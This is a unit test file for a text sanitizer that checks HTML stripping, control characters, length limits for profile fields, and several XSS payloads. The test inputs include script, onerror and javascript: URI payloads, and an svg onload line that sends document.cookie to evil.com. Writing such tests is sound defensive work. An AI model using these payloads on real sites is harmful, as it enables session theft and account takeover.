import { sanitizeText } from './text-sanitizer';

describe('sanitizeText', () => {
  describe('basic sanitization', () => {
    it('returns plain text unchanged', () => {
      expect(sanitizeText('Hello from Lagos!', 'bio')).toBe(
        'Hello from Lagos!',
      );
    });

    it('preserves emoji and unicode', () => {
      expect(sanitizeText('Hello 🌍 日本語', 'bio')).toBe('Hello 🌍 日本語');
    });

    it('strips all HTML tags', () => {
      expect(sanitizeText('<b>bold</b> text', 'bio')).toBe('bold text');
    });

    it('returns empty string for empty input', () => {
      expect(sanitizeText('', 'bio')).toBe('');
    });

    it('trims whitespace', () => {
      expect(sanitizeText('  hello  ', 'bio')).toBe('hello');
    });

    it('rejects control characters', () => {
      expect(sanitizeText('hello\x00world', 'bio')).toBe('helloworld');
      expect(sanitizeText('hello\x08world', 'bio')).toBe('helloworld');
    });

    it('preserves tab and newline', () => {
      expect(sanitizeText('line1\nline2', 'bio')).toBe('line1\nline2');
    });
  });

  describe('XSS payloads', () => {
    it('strips <script> tags', () => {
      expect(sanitizeText('<script>alert("xss")</script>Hello', 'bio')).toBe(
        'Hello',
      );
    });

    it('strips img onerror payload', () => {
      expect(sanitizeText('<img src=x onerror="alert(1)">', 'bio')).toBe('');
    });

    it('strips svg onload payload', () => {
      expect(
        sanitizeText(
          '<svg onload="fetch(\'https://evil.com?c=\'+document.cookie)">',
          'bio',
        ),
      ).toBe('');
    });

    it('strips javascript: URI in anchor', () => {
      const result = sanitizeText(
        '<a href="javascript:alert(1)">click</a>',
        'bio',
      );
      expect(result).toBe('click');
      expect(result).not.toContain('javascript:');
    });

    it('strips event handler attributes', () => {
      expect(sanitizeText('<div onclick="alert(1)">text</div>', 'bio')).toBe(
        'text',
      );
    });

    it('strips style-based XSS', () => {
      expect(
        sanitizeText(
          '<style>body{background:url("javascript:alert(1)")}</style>text',
          'bio',
        ),
      ).toBe('text');
    });

    it('strips data: URI injection', () => {
      expect(
        sanitizeText(
          '<img src="data:text/html,<script>alert(1)</script>">',
          'bio',
        ),
      ).toBe('');
    });
  });

  describe('field length limits', () => {
    it('truncates bio to 500 chars', () => {
      expect(sanitizeText('a'.repeat(600), 'bio')).toHaveLength(500);
    });

    it('truncates displayName to 60 chars', () => {
      expect(sanitizeText('a'.repeat(100), 'displayName')).toHaveLength(60);
    });

    it('truncates message to 280 chars', () => {
      expect(sanitizeText('a'.repeat(400), 'message')).toHaveLength(280);
    });
  });
});
